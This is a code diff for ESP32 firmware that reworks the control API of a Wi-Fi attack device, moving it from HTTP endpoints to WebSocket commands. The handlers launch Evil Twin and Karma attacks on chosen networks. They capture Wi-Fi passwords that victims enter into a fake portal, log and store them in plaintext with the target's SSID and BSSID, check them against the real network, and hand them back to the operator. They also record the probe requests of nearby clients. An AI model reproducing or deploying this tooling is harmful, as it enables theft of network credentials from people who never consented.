@@ -1,17 +1,24 @@
 #include <string.h>
-#include "esp_http_server.h"
-#include "esp_log.h"
-#include "cJSON.h"
+#include <esp_timer.h>
+#include <esp_log.h>
+#include <cJSON.h>
+#include <stdarg.h>
 #include "utils.h"
 #include "config.h"
 #include "evil_twin.h"
+#include "karma_attack.h"
 #include "server_api.h"
 #include "passwordMng.h"
-#include "esp_sleep.h"
 #include "vendors.h"
-
+#include "target.h"
+#include "nvs_keys.h"
 
 static const char *TAG = "SERVER_API";
+
+typedef struct {
+    api_commant_t cmd;
+    esp_err_t (*handler)(ws_frame_req_t *req);
+} api_cmd_t;
 
 
 const char* mime_from_path(const char* path) {
@@ -26,16 +33,101 @@ const char* mime_from_path(const char* path) {
 }
 
 
-static esp_err_t cors_prevention_handler(httpd_req_t *req)
+static void shutdown_task(void *pvParameter)
 {
-    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
-    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "POST, OPTIONS");
-    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
-    return httpd_resp_send(req, NULL, 0);
+    vTaskDelay(pdMS_TO_TICKS(1000));
+    evil_twin_stop_attack();
+
+    /* Enter in deep sleep to preserve battery power */
+    /* Only hardware wakeup (Reset button) */
+    //esp_deep_sleep_start();
+
+    vTaskDelete(NULL);
 }
 
 
-static esp_err_t admin_get_ap_settings(httpd_req_t *req) 
+static void api_send_status_frame(ws_frame_req_t *req, const char* status, const char *message)
+{
+    cJSON *root = cJSON_CreateObject();
+    if (root == NULL) return;
+
+    cJSON_AddNumberToObject(root, "req_id", req->req_id);
+    cJSON_AddStringToObject(root, "status", status);
+    cJSON_AddStringToObject(root, "message", message);
+
+    char *payload = cJSON_PrintUnformatted(root);
+    cJSON_Delete(root);
+
+    if (payload == NULL) return;
+
+    ws_frame_req_t cmd;
+    cmd.hd = req->hd;
+    cmd.fd = req->fd;
+    cmd.payload = payload;
+    cmd.len = strlen(payload);
+    cmd.need_free = true;
+
+    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
+        free(payload);
+    }
+}
+
+
+static esp_err_t api_get_status(ws_frame_req_t *req)
+{
+    int64_t time_us = esp_timer_get_time();
+    int64_t time_s = time_us / 1000000;
+    int hours = time_s / 3600;
+    int minutes = (time_s % 3600) / 60;
+    int seconds = time_s % 60;
+    char uptime_str[16];
+    snprintf(uptime_str, sizeof(uptime_str), "%02d:%02d:%02d", hours, minutes, seconds);
+
+    /* Get RAM Usage percentage */
+    size_t total_ram = heap_caps_get_total_size(MALLOC_CAP_DEFAULT);
+    size_t free_ram = heap_caps_get_free_size(MALLOC_CAP_DEFAULT);
+    int ram_usage = 0;
+    if (total_ram > 0) {
+        ram_usage = 100 - ((free_ram * 100) / total_ram);
+    }
+
+    cJSON *root = cJSON_CreateObject();
+    if (root == NULL) {
+        return ESP_FAIL;
+    }
+    cJSON_AddNumberToObject(root, "req_id", req->req_id);
+    cJSON_AddStringToObject(root, "type", "get_status");
+    cJSON_AddStringToObject(root, "uptime", uptime_str);
+    cJSON_AddNumberToObject(root, "ram", ram_usage);
+    cJSON_AddNumberToObject(root, "packets", 0);
+    cJSON_AddBoolToObject(root, "sd", false);
+    bool attack_running = false;
+    cJSON_AddBoolToObject(root, "evil_twin_running", attack_running);
+
+    char *json_response = cJSON_PrintUnformatted(root);
+    cJSON_Delete(root);
+
+    if (json_response == NULL) {
+        return ESP_FAIL;
+    }
+
+    ws_frame_req_t cmd;
+    cmd.hd = req->hd;
+    cmd.fd = req->fd;
+    cmd.payload = json_response;
+    cmd.len = strlen(json_response);
+    cmd.need_free = true;
+
+    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
+        free(json_response);
+        return ESP_FAIL;
+    }
+    
+    return ESP_OK;
+}
+
+
+static esp_err_t api_admin_get_ap_settings(ws_frame_req_t *req) 
 {
     char ssid[32] = {0};
     char password[64] = {0};
@@ -56,67 +148,50 @@ static esp_err_t admin_get_ap_settings(httpd_req_t *req)
     }
 
     cJSON *root = cJSON_CreateObject();
+    cJSON_AddNumberToObject(root, "req_id", req->req_id);
+    cJSON_AddStringToObject(root, "type", "get_ap_settings");
     cJSON_AddStringToObject(root, "ssid", ssid);
     cJSON_AddStringToObject(root, "password", password);
     cJSON_AddNumberToObject(root, "channel", channel);
+
     char *json_response = cJSON_PrintUnformatted(root);
     cJSON_Delete(root);
 
     if (!json_response) {
-        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON alloc failed");
         return ESP_FAIL;
     }
 
-    httpd_resp_set_type(req, "application/json");
-    httpd_resp_send(req, json_response, HTTPD_RESP_USE_STRLEN);
-    free(json_response);
+    ws_frame_req_t cmd;
+    cmd.hd = req->hd;
+    cmd.fd = req->fd;
+    cmd.payload = json_response;
+    cmd.len = strlen(json_response);
+    cmd.need_free = true;
+
+    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
+        free(json_response);
+        return ESP_FAIL;
+    }
+
     return ESP_OK;
 }
 
 
-static esp_err_t admin_set_ap_settings(httpd_req_t *req)
+static esp_err_t api_admin_set_ap_settings(ws_frame_req_t *req)
 {
-    int total_len = req->content_len;
-    int cur_len = 0;
-    int ret;
-
-    if (total_len <= 0 || total_len > 1024) {
-        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid body");
-        return ESP_OK;
+    cJSON *json = cJSON_Parse(req->payload);
+    if (!json) {
+        ESP_LOGE(TAG, "Invalid JSON received");
+        return ESP_FAIL;
     }
-    char *buf = malloc(total_len + 1);
-    if (!buf) {
-        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "No mem");
-        return ESP_OK;
-    }
+    const cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
+    const cJSON *j_password = cJSON_GetObjectItemCaseSensitive(json, "password");
+    const cJSON *j_channel = cJSON_GetObjectItemCaseSensitive(json, "channel");
 
-    while (cur_len < total_len) {
-        ret = httpd_req_recv(req, buf + cur_len, total_len - cur_len);
-        if (ret <= 0) {
-            if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
-                continue;
-            }
-            free(buf);
-            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Recv error");
-            return ESP_OK;
-        }
-        cur_len += ret;
-    }
-    buf[total_len] = '\0';
-
-    cJSON *root = cJSON_Parse(buf);
-    if (!root) {
-        free(buf);
-        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
-        return ESP_OK;
-    }
-    const cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(root, "ssid");
-    const cJSON *j_password = cJSON_GetObjectItemCaseSensitive(root, "password");
-    const cJSON *j_channel = cJSON_GetObjectItemCaseSensitive(root, "channel");
-
-    char ssid[64] = {0};
+    char ssid[32] = {0};
     char password[64] = {0};
     int channel = 1;
+
     if (cJSON_IsString(j_ssid)) {
         strlcpy(ssid, j_ssid->valuestring, sizeof(ssid));
     }
@@ -126,22 +201,19 @@ static esp_err_t admin_set_ap_settings(httpd_req_t *req)
     if (cJSON_IsNumber(j_channel)) {
         channel = j_channel->valueint;
     }
-    cJSON_Delete(root);
-    free(buf);
-    
-    /* Save new settings */
-    save_string_to_flash(WIFI_SSID_KEY, ssid);
-    save_string_to_flash(WIFI_PASS_KEY, password);
+    cJSON_Delete(json);
+
+    save_string_to_flash(WIFI_SSID_KEY, (const char *)ssid);
+    save_string_to_flash(WIFI_PASS_KEY, (const char *)password);
     save_int_to_flash(WIFI_CHAN_KEY, channel);
-    
-    /* Send response */
-    httpd_resp_send(req, "Settings updated successfully!\nRestart the device to make it effective!", HTTPD_RESP_USE_STRLEN);
-    httpd_resp_send(req, NULL, 0);
+
+    api_send_status_frame(req, "ok", "AP settings saved successfully.");
+
     return ESP_OK;
-} 
+}
 
 
-static esp_err_t targets_scan_handler(httpd_req_t *req)
+static esp_err_t api_wifi_scan(ws_frame_req_t *req)
 {
     wifi_scan_config_t scan_config = {
         .ssid = NULL,
@@ -154,16 +226,21 @@ static esp_err_t targets_scan_handler(httpd_req_t *req)
         .home_chan_dwell_time = 100,
     };
 
+    ws_frame_req_t cmd;
+    cmd.hd = req->hd;
+    cmd.fd = req->fd;
+    cmd.frame_type = WS_TX_FRAME;
+
     esp_err_t err = esp_wifi_scan_start(&scan_config, true);
     if (err != ESP_OK) {
-        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "esp_wifi_scan_start failed");
+        api_send_status_frame(req, "error", "Failed to start scan");
         return err;
     }
 
     uint16_t ap_count = 0;
     err = esp_wifi_scan_get_ap_num(&ap_count);
     if (err != ESP_OK) {
-        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "esp_wifi_scan_get_ap_num failed");
+        api_send_status_frame(req, "error", "Failed to get AP count");
         return err;
     }
 
@@ -171,23 +248,27 @@ static esp_err_t targets_scan_handler(httpd_req_t *req)
     if (ap_count > 0) {
         ap_records = (wifi_ap_record_t *)calloc(ap_count, sizeof(wifi_ap_record_t));
         if (!ap_records) {
-            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "out of memory (ap_records)");
+            api_send_status_frame(req, "error", "Out of memory");
             return ESP_ERR_NO_MEM;
         }
 
         err = esp_wifi_scan_get_ap_records(&ap_count, ap_records);
         if (err != ESP_OK) {
             free(ap_records);
-            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "esp_wifi_scan_get_ap_records failed");
+            api_send_status_frame(req, "error", "Failed to get AP records");
             return err;
         }
     }
 
+    cJSON *response_obj = cJSON_CreateObject();
+    cJSON_AddNumberToObject(response_obj, "req_id", req->req_id);
+    cJSON_AddStringToObject(response_obj, "type", "scan_result");
+
     cJSON *root = cJSON_CreateArray();
     if (!root) {
         free(ap_records);
-        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "cJSON_CreateArray failed");
-        return ESP_FAIL;
+        api_send_status_frame(req, "error", "cJSON_CreateArray failed");
+        return ESP_ERR_NO_MEM;
     }
 
     for (int i = 0; i < ap_count; i++) {
@@ -205,8 +286,8 @@ static esp_err_t targets_scan_handler(httpd_req_t *req)
         if (!obj) {
             cJSON_Delete(root);
             free(ap_records);
-            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "cJSON_CreateObject failed");
-            return ESP_FAIL;
+            api_send_status_frame(req, "error", "cJSON_CreateObject failed");
+            return ESP_ERR_NO_MEM;
         }
 
         cJSON_AddStringToObject(obj, "ssid", ssid);
@@ -220,227 +301,352 @@ static esp_err_t targets_scan_handler(httpd_req_t *req)
         cJSON_AddBoolToObject(obj, "wps", ap_records[i].wps ? 1 : 0);
         cJSON_AddItemToArray(root, obj);
     }
+    cJSON_AddItemToObject(response_obj, "data", root);
 
-    char *json = cJSON_PrintUnformatted(root);
+    char *json = cJSON_PrintUnformatted(response_obj);
+    if (ap_records) free(ap_records);
+    cJSON_Delete(response_obj);
+
     if (!json) {
-        cJSON_Delete(root);
-        free(ap_records);
-        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "cJSON_PrintUnformatted failed");
-        return ESP_FAIL;
+        return ESP_ERR_NO_MEM;
     }
 
-    httpd_resp_set_type(req, "application/json");
-    httpd_resp_send(req, json, HTTPD_RESP_USE_STRLEN);
+    cmd.payload = json; 
+    cmd.len = strlen(json);
+    cmd.need_free = true;
 
-    free(json);
-    cJSON_Delete(root);
-    free(ap_records);
+    if(ws_send_command_to_queue(&cmd) != ESP_OK) {
+        free(json);
+        ESP_LOGE(TAG, "Queue full");
+        return ESP_FAIL;
+    }
 
     return ESP_OK;
 }
 
 
-static esp_err_t evil_twin_handler(httpd_req_t *req) 
+static esp_err_t api_start_evil_twin(ws_frame_req_t *req)
 {
-    char buffer[300];
-    unsigned int auth_tmp = 0;
-    int ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
-    if (ret <= 0) {
-        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
-            httpd_resp_send_408(req);
-        }
+    cJSON *json = cJSON_Parse(req->payload);
+    if (!json) {
+        api_send_status_frame(req, "error", "Invalid JSON");
         return ESP_FAIL;
     }
-    buffer[ret] = '\0';
-    char bssid[64] = {0};
+
     target_info_t target_info = { 0 };
-    sscanf(buffer,"ssid=%32[^&]&bssid=%17[^&]&channel=%hhu&signal=%hhd&authmode_code=%u&group=%hhu&pairwise=%hhu&scheme=%hhd", 
-    target_info.ssid, bssid, &target_info.channel, &target_info.rssi, &auth_tmp, (unsigned char *)&target_info.group_cipher, (unsigned char *)&target_info.pairwise_cipher, &target_info.attack_scheme);
 
-    target_info.authmode = (wifi_auth_mode_t)auth_tmp;
-    ESP_LOGI(TAG, "Starting Evil Twin attack on SSID: %s, BSSID: %s, Channel: %d, Signal: %d, Authmode: %s",
-             target_info.ssid, bssid, target_info.channel, target_info.rssi, authmode_to_str(target_info.authmode));
+    cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
+    cJSON *j_bssid = cJSON_GetObjectItemCaseSensitive(json, "bssid");
+    cJSON *j_chan = cJSON_GetObjectItemCaseSensitive(json, "channel");
+    cJSON *j_rssi = cJSON_GetObjectItemCaseSensitive(json, "signal");
+    cJSON *j_auth = cJSON_GetObjectItemCaseSensitive(json, "authmode_code");
+    cJSON *j_scheme = cJSON_GetObjectItemCaseSensitive(json, "scheme");
 
-    if (sscanf(bssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
+    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
+    if (cJSON_IsNumber(j_rssi)) target_info.rssi = (int8_t)j_rssi->valueint;
+    if (cJSON_IsNumber(j_auth)) target_info.authmode = (wifi_auth_mode_t)j_auth->valueint;
+    if (cJSON_IsNumber(j_scheme)) target_info.attack_scheme = (uint8_t)j_scheme->valueint;
+
+    if (cJSON_IsString(j_bssid)) {
+        sscanf(j_bssid->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                &target_info.bssid[0], &target_info.bssid[1], &target_info.bssid[2],
-               &target_info.bssid[3], &target_info.bssid[4], &target_info.bssid[5]) != 6) {
-        ESP_LOGE(TAG, "Errore nel parsing del BSSID\n");
-        return ESP_FAIL;
+               &target_info.bssid[3], &target_info.bssid[4], &target_info.bssid[5]);
     }
 
-    httpd_resp_sendstr(req, "EvilTwin attack is started, this page will no longer be enabled until device reset.");
-    httpd_resp_send(req, NULL, 0);
+    cJSON_Delete(json);
 
-    /* Start evil twin attack */
+    ESP_LOGI(TAG, "Starting Evil Twin on SSID: %s (Ch: %d)", target_info.ssid, target_info.channel);
     evil_twin_start_attack(&target_info);
 
+    api_send_status_frame(req, "ok", "Evil Twin Started");
     return ESP_OK;
 }
 
 
-static esp_err_t get_password_handler(httpd_req_t *req) 
+static esp_err_t api_get_evlitwin_target(ws_frame_req_t *req)
 {
-    password_manager_read_passwords(req);
-    return ESP_OK;
-}
+    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
 
-
-static esp_err_t get_evlitwin_target_handler(httpd_req_t *req)
-{
-    target_info_t *target = evil_twin_get_target_info();
-
-    /* Logo path */
     char path[64];
     strlcpy(path, "/logo/", sizeof(path));
     strlcat(path, vendorToString(target->vendor), sizeof(path));
     strlcat(path, ".png", sizeof(path));
 
     cJSON *root = cJSON_CreateObject();
+    cJSON_AddNumberToObject(root, "req_id", req->req_id);
+    cJSON_AddStringToObject(root, "type", "eviltwin_target");
     cJSON_AddStringToObject(root, "logo", path);
     cJSON_AddStringToObject(root, "ssid", (const char*)target->ssid);
     cJSON_AddStringToObject(root, "vendor", vendorToString(target->vendor));
+
     char *json_response = cJSON_PrintUnformatted(root);
     cJSON_Delete(root);
 
-    if (!json_response) {
-        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON alloc failed");
+    if (!json_response) return ESP_FAIL;
+
+    ws_frame_req_t cmd;
+    cmd.hd = req->hd;
+    cmd.fd = req->fd;
+    cmd.payload = json_response;
+    cmd.len = strlen(json_response);
+    cmd.need_free = true;
+
+    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
+        free(json_response);
         return ESP_FAIL;
     }
-
-    httpd_resp_set_type(req, "application/json");
-    httpd_resp_send(req, json_response, HTTPD_RESP_USE_STRLEN);
-    free(json_response);
     return ESP_OK;
 }
 
 
-void shutdown_task(void *pvParameter)
+static esp_err_t api_check_input_password(ws_frame_req_t *req)
 {
-    vTaskDelay(pdMS_TO_TICKS(1000));
-    evil_twin_stop_attack();
-
-    /* Enter in deep sleep to preserve battery power */
-    /* Only hardware wakeup (Reset button) */
-    //esp_deep_sleep_start();
-
-    vTaskDelete(NULL);
-}
-
-
-static esp_err_t check_input_password_handler(httpd_req_t *req)
-{
-    target_info_t *target = evil_twin_get_target_info();
-
-	char buffer[256] = { 0 };
-    int ret = 0;
-
-    ret = httpd_req_recv(req, buffer, sizeof(buffer) - 1);
-    if (ret <= 0) {
-        if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
-            httpd_resp_send_408(req);
-        }
+    cJSON *json = cJSON_Parse(req->payload);
+    if (!json) return ESP_FAIL;
+    
+    cJSON *j_pass = cJSON_GetObjectItemCaseSensitive(json, "password");
+    if (!cJSON_IsString(j_pass)) {
+        cJSON_Delete(json);
+        api_send_status_frame(req, "error", "Missing password");
         return ESP_FAIL;
     }
 
-	char password[64] = { 0 };
-    sscanf(buffer, "password=%63[^&]", password);
+    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
+    char buffer[256] = { 0 };
+    snprintf(buffer, sizeof(buffer), "%s,%02X:%02X:%02X:%02X:%02X:%02X,%s", 
+             (const char *)target->ssid, 
+             target->bssid[0], target->bssid[1], target->bssid[2], target->bssid[3], target->bssid[4], target->bssid[5], 
+             j_pass->valuestring);
+    
+    password_manager_save(buffer);
+    ESP_LOGI(TAG, "Captured: %s", buffer);
 
-	/* Save password */
-	memset(&buffer, 0, sizeof(buffer));
-	snprintf(buffer, sizeof(buffer), "%s,%02X:%02X:%02X:%02X:%02X:%02X,%s", (const char *)target->ssid, target->bssid[0], target->bssid[1], target->bssid[2], target->bssid[3], target->bssid[4], target->bssid[5], password);
-	password_manager_save(buffer);
-	ESP_LOGI(TAG, "Password saved: %s", buffer);
+    bool correct = evil_twin_check_password(j_pass->valuestring);
+    cJSON_Delete(json);
 
-	/* Check password and send response */
-	if( evil_twin_check_password(password) == true )
-	{
-		httpd_resp_send(req, "ok", HTTPD_RESP_USE_STRLEN);
-		httpd_resp_send(req, NULL, 0);
-
-        /* Stop attack and restore */
+    if (correct) {
+        api_send_status_frame(req, "ok", "Password Correct");
         xTaskCreate(shutdown_task, "shutdown_task", 4096, NULL, 5, NULL);
-	}
-	else
-	{
-		httpd_resp_send(req, "bad", HTTPD_RESP_USE_STRLEN);
-		httpd_resp_send(req, NULL, 0);
-	}
-	return ESP_OK;
+    } else {
+        api_send_status_frame(req, "bad", "Password Incorrect");
+    }
+    return ESP_OK;
 }
 
 
-esp_err_t register_server_api_handlers(httpd_handle_t server)
+static esp_err_t api_get_passwords(ws_frame_req_t *req)
 {
-    /* Handler for CORS preflight requests */
-    httpd_uri_t cors_preflight_uri = {
-        .uri = "/*",
-        .method = HTTP_OPTIONS,
-        .handler = cors_prevention_handler,
-        .user_ctx = NULL
-    };
-    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &cors_preflight_uri));
+    FILE *f = fopen(PASSWORD_FILE, "r");
+    char *file_content = NULL;
+    long length = 0;
 
-    /* Handler for get AP settings */
-    httpd_uri_t get_ap_settings_uri = {
-        .uri = "/api/ap_settings/get",
-        .method = HTTP_GET,
-        .handler = admin_get_ap_settings,
-        .user_ctx = NULL
-    };
-    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &get_ap_settings_uri));
+    if (f) {
+        fseek(f, 0, SEEK_END);
+        length = ftell(f);
+        fseek(f, 0, SEEK_SET);
+        if (length > 0) {
+            file_content = malloc(length + 1);
+            if (file_content) {
+                fread(file_content, 1, length, f);
+                file_content[length] = '\0';
+            }
+        }
+        fclose(f);
+    }
 
-    /* Handler for set AP settings */
-    httpd_uri_t set_ap_settings_uri = {
-        .uri = "/api/ap_settings/set",
-        .method = HTTP_POST,
-        .handler = admin_set_ap_settings,
-        .user_ctx = NULL
-    };
-    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &set_ap_settings_uri));
+    cJSON *root = cJSON_CreateObject();
+    cJSON_AddNumberToObject(root, "req_id", req->req_id);
+    cJSON_AddStringToObject(root, "type", "passwords");
+    cJSON_AddStringToObject(root, "content", file_content ? file_content : "");
 
-    httpd_uri_t targets_scan_uri = {
-        .uri = "/api/wifi_scan",
-        .method = HTTP_GET,
-        .handler = targets_scan_handler,
-        .user_ctx = NULL
-    };
-    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &targets_scan_uri));
+    if (file_content) free(file_content);
 
-    /* Handler for starting evil twin attack */
-    httpd_uri_t evil_twin_uri = {
-        .uri = "/api/evil_twin",
-        .method = HTTP_POST,
-        .handler = evil_twin_handler,
-        .user_ctx = NULL
-    };
-    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &evil_twin_uri));
+    char *json_response = cJSON_PrintUnformatted(root);
+    cJSON_Delete(root);
 
-    /* Get saved password */
-    httpd_uri_t get_password_uri = {
-        .uri = "/get_passwords",
-        .method = HTTP_POST,
-        .handler = get_password_handler,
-        .user_ctx = NULL
-    };
-    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &get_password_uri));
+    if (!json_response) return ESP_FAIL;
 
-    /* Get vendor string */
-    httpd_uri_t get_evlitwin_target = {
-        .uri = "/api/get_evlitwin_target",
-        .method = HTTP_GET,
-        .handler = get_evlitwin_target_handler,
-        .user_ctx = NULL
-    };
-    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &get_evlitwin_target));
-
-    /* Get vendor string */
-    httpd_uri_t check_input_password = {
-        .uri = "/api/check_input_password",
-        .method = HTTP_POST,
-        .handler = check_input_password_handler,
-        .user_ctx = NULL
-    };
-    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &check_input_password));
+    ws_frame_req_t cmd;
+    cmd.hd = req->hd;
+    cmd.fd = req->fd;
+    cmd.payload = json_response;
+    cmd.len = strlen(json_response);
+    cmd.need_free = true;
+    ws_send_command_to_queue(&cmd);
 
     return ESP_OK;
+}
+
+
+static esp_err_t api_karma_scan(ws_frame_req_t *req)
+{
+    cJSON *json = cJSON_Parse(req->payload);
+    if (!json) return ESP_FAIL;
+    
+    cJSON *j_act = cJSON_GetObjectItemCaseSensitive(json, "start_stop"); // 1 or 0
+    if (cJSON_IsNumber(j_act)) {
+        if (j_act->valueint == 1) {
+            karma_attack_probes_scan_start();
+            api_send_status_frame(req, "ok", "Karma Scan Started");
+        } else {
+            karma_attack_probes_scan_stop();
+            api_send_status_frame(req, "ok", "Karma Scan Stopped");
+        }
+    }
+    cJSON_Delete(json);
+    return ESP_OK;
+}
+
+
+static esp_err_t api_get_karma_probes(ws_frame_req_t *req)
+{
+    const probe_request_list_t *list = wifi_sniffer_get_captured_probes();
+    
+    cJSON *root = cJSON_CreateObject();
+    cJSON_AddNumberToObject(root, "req_id", req->req_id);
+    cJSON_AddStringToObject(root, "type", "karma_probes");
+    
+    cJSON *arr = cJSON_CreateArray();
+    if (list) {
+        for (int i = 0; i < list->num_probes; i++) {
+            cJSON *item = cJSON_CreateObject();
+            char mac_str[18];
+            snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
+                     list->probes[i].mac[0], list->probes[i].mac[1], list->probes[i].mac[2],
+                     list->probes[i].mac[3], list->probes[i].mac[4], list->probes[i].mac[5]);
+
+            cJSON_AddStringToObject(item, "mac", mac_str);
+            cJSON_AddStringToObject(item, "ssid", list->probes[i].ssid);
+            cJSON_AddNumberToObject(item, "rssi", list->probes[i].rssi);
+            cJSON_AddNumberToObject(item, "channel", list->probes[i].channel);
+            cJSON_AddItemToArray(arr, item);
+        }
+    }
+    cJSON_AddItemToObject(root, "data", arr);
+
+    char *json = cJSON_PrintUnformatted(root);
+    cJSON_Delete(root);
+
+    if (!json) return ESP_FAIL;
+
+    ws_frame_req_t cmd;
+    cmd.hd = req->hd;
+    cmd.fd = req->fd;
+    cmd.payload = json;
+    cmd.len = strlen(json);
+    cmd.need_free = true;
+    ws_send_command_to_queue(&cmd);
+
+    return ESP_OK;
+}
+
+
+static esp_err_t api_karma_set_target(ws_frame_req_t *req)
+{
+    cJSON *json = cJSON_Parse(req->payload);
+    if (!json) return ESP_FAIL;
+
+    target_info_t target_info = { 0 };
+    cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
+    cJSON *j_chan = cJSON_GetObjectItemCaseSensitive(json, "channel");
+    cJSON *j_scheme = cJSON_GetObjectItemCaseSensitive(json, "scheme");
+
+    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
+    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
+    if (cJSON_IsNumber(j_scheme)) target_info.attack_scheme = (uint8_t)j_scheme->valueint;
+
+    cJSON_Delete(json);
+
+    karma_attack_set_target(&target_info);
+    api_send_status_frame(req, "ok", "Karma Attack Started");
+    return ESP_OK;
+}
+
+
+static const api_cmd_t api_cmd_list[] = {
+    { API_GET_STATUS, api_get_status },
+    { API_SET_AP_SETTINGS, api_admin_set_ap_settings },
+    { API_GET_AP_SETTINGS, api_admin_get_ap_settings },
+    { API_WIFI_SCAN, api_wifi_scan },
+    { API_START_EVILTWIN, api_start_evil_twin },
+    { API_GET_EVILTWIN_TARGET, api_get_evlitwin_target },
+    { API_CHECK_INPUT_PASSWORD, api_check_input_password },
+    { API_GET_PASSWORDS, api_get_passwords },
+    { API_KARMA_ATTACK_SCAN, api_karma_scan },
+    { API_GET_KARMA_PROBES, api_get_karma_probes },
+    { API_KARMA_ATTACK_START, api_karma_set_target },
+};
+
+
+void http_api_parse(ws_frame_req_t *req)
+{
+    cJSON *root = cJSON_Parse(req->payload);
+    if (root == NULL) {
+        ESP_LOGE(TAG, "Invalid JSON received");
+        return;
+    }
+
+    cJSON *jcmd = cJSON_GetObjectItemCaseSensitive(root, "cmd");
+    if (!cJSON_IsNumber(jcmd)) {
+        ESP_LOGE(TAG, "Missing/invalid cmd");
+        cJSON_Delete(root);
+        return;
+    }
+
+    cJSON *jid = cJSON_GetObjectItemCaseSensitive(root, "req_id");
+    if (cJSON_IsNumber(jid)) {
+        req->req_id = jid->valueint; 
+    } else {
+        req->req_id = 0;
+    }
+
+    int cmd = jcmd->valueint;
+    bool handled = false;
+    for (size_t i = 0; i < sizeof(api_cmd_list) / sizeof(api_cmd_t); i++) {
+        if (api_cmd_list[i].cmd == cmd) {
+            api_cmd_list[i].handler(req);
+            handled = true;
+            break;
+        }
+    }
+
+    if (!handled) {
+        ESP_LOGW(TAG, "Unknown command: %d", cmd);
+        api_send_status_frame(req, "error", "Unknown command");
+    }
+
+    cJSON_Delete(root);
+}
+
+
+void ws_log(const char *level, const char *format, ...)
+{
+    char buffer[256];
+    va_list args;
+    va_start(args, format);
+    vsnprintf(buffer, sizeof(buffer), format, args);
+    va_end(args);
+
+    cJSON *root = cJSON_CreateObject();
+    if (root == NULL) return;
+
+    cJSON_AddStringToObject(root, "type", "log");
+    cJSON_AddStringToObject(root, "level", level);
+    cJSON_AddStringToObject(root, "msg", buffer);
+    char *payload = cJSON_PrintUnformatted(root);
+    cJSON_Delete(root);
+
+    if (payload == NULL) return;
+
+    ws_frame_req_t cmd;
+    cmd.hd = get_web_server_handle(); 
+    cmd.fd = -1; //BROADCAST
+    cmd.payload = payload;
+    cmd.len = strlen(payload);
+    cmd.need_free = true;
+
+    if (ws_send_broadcast_to_queue(&cmd) != ESP_OK) {
+        free(payload);
+    }
 }
